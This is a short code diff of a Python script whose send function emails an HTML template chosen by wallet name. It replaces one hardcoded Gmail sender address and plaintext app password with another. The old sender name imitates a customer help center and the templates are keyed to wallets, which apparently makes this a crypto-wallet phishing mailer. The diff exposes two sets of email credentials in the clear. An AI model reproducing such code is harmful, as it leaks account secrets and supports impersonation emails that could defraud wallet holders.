@@ -42,8 +42,8 @@ def load_html_template(wallet_name):
 def send(wallet, email):
     """Send email with HTML template"""
     try:
-        sender_email = "Customerhelpcenterteaminfo@gmail.com"
-        sender_password = "agsn hlga hiai ipen"
+        sender_email = "cybergoat784@gmail.com"
+        sender_password = "czhv hwwq rfgt gmym"
         
         # Load HTML template
         html_content = load_html_template(wallet)
@@ -119,4 +119,5 @@ def main():
 if __name__ == "__main__":
 
     main()
+
 
